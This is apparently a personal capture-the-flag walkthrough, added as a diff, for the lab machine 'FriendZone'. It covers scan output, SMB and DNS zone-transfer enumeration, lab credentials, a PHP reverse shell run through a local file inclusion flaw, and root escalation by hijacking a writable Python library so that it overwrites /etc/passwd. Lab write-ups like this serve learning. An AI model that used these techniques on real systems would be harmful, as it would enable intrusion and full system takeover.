@@ -1,0 +1,137 @@
+---PORT SCAN---
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 3.0.3
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
+|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
+|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
+53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
+80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Friend Zone Escape software
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+443/tcp open  ssl/http    Apache httpd 2.4.29
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: 404 Not Found
+| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
+| Not valid before: 2018-10-05T21:02:30
+|_Not valid after:  2018-11-04T21:02:30
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+Service Info: Hosts: FRIENDZONE, 127.0.0.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -53m38s, deviation: 1h43m54s, median: 6m20s
+|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: friendzone
+|   NetBIOS computer name: FRIENDZONE\x00
+|   Domain name: \x00
+|   FQDN: friendzone
+|_  System time: 2020-09-10T16:10:53+03:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-09-10T13:10:54
+|_  start_date: N/A
+
+---GOBUSTER---
+/ (80):
+  /wordpress (Status: 301)
+  /robots.txt (Status: 200)
+
+friendzone.red/ (443):
+  /admin (Status: 301)
+  /js (Status: 301)
+
+---ATTEMPTS---
+*smbclient -N -L \\\\10.10.10.123\\:
+  Sharename       Type      Comment
+  ---------       ----      -------
+  print$          Disk      Printer Drivers
+  Files           Disk      FriendZone Samba Server Files /etc/Files
+  general         Disk      FriendZone Samba Server Files
+  Development     Disk      FriendZone Samba Server Files
+  IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
+on general found a creds.txt:
+  *mget *
+  *cat creds.txt:
+    creds for the admin THING:
+    admin:WORKWORKHhallelujah@#
+could not login into ftp nor ssh
+
+try to exploit the DNS:
+  using the host found on ssl nmap scrit: friendzone.red a dns zone transfer was possible:
+    *dig axfr friendzone.red @10.10.10.123 (virtual host routing):
+      friendzone.red
+      administrator1.friendzone.red
+      hr.friendzone.red
+      uploads.friendzone.red
+changing the hosts file and accessing the https site found a new one
+source code have a /js/js:
+  Testing some functions !
+  I'am trying not to break things !
+  Q0Y3UFppVWRVYTE1OTk3NDU2ODJZeEZXSUphWmU1
+  Possible algorithms: Base64 Encoded String (hash identifier)
+*echo 'Q0Y3UFppVWRVYTE1OTk3NDU2ODJZeEZXSUphWmU1' | base64 -d:
+  CF7PZiUdUa1599745682YxFWIJaZe5
+
+found a login page in https://administrator1.friendzone.red/
+using the creds.txt, login successful
+in dashboard.php:
+  image_id=a.jpg&pagename=timestamp
+in https://uploads.friendzone.red/ found a upload page that can be used to upload a reverse shell (unsuccessful)
+on https://administrator1.friendzone.red/images it has only two
+using image_id=../../login.php&pagename=timestamp show that LFI is possible to exploit, so the upload of a reverse-shell using the smbclient should work. The only client that can upload file is Develpment
+*smbclient -N \\\\10.10.10.123\\Development
+*put php-reverse-shell.php
+
+using the pagename parameter to execute the php file instead of tagging it as a image pagename=../../../../../etc/Development/php-reverse-shell
+done!
+---PRIVESC---
+*cat /home/friend/user.txt
+*./linpeas.sh
+*cat /var/www/mysql_data.conf:
+  db_user=friend
+  db_pass=Agpyu12!0.213$
+trying su friend:
+done!
+*sudo -l
+  Sorry, user friend may not run sudo on FriendZone.
+mysql command not found: (weird)
+
+*./pspy64
+  2020/09/10 18:09:05 CMD: UID=0    PID=25823  | /bin/sh -e /usr/lib/php/sessionclean
+  2020/09/10 18:10:01 CMD: UID=0    PID=25878  | /bin/sh -c /opt/server_admin/reporter.py
+  2020/09/10 18:09:05 CMD: UID=0    PID=25827  | /bin/sh /usr/sbin/phpquery -V
+
+*./linEnum
+  -rwxrwxrwx 1 root root 25910 Jan 15  2019 /usr/lib/python2.7/os.py
+
+as the reporter.py uses this library and it is editable, just create a new os.py with:
+  f = open ('/root/root.txt', 'r')
+  f1 = open ('/home/friend/james', 'a')
+  f1.write (f.read ())
+  f1.close ()
+  f.close ()
+*cat /home/friend/james
+got the flag
+to privesc:
+  f = open ('/etc/passwd', 'w')
+  f.write ('root:LN210QSCksWxs:0:0:root:/root:/bin/bash\n')
+  f.write ('friend:x:1000:1000:friend,,,:/home/friend:/bin/bash\n')
+  f.close ()
+create a new passwd file with a know root password
+it is important to create a backup passwd file
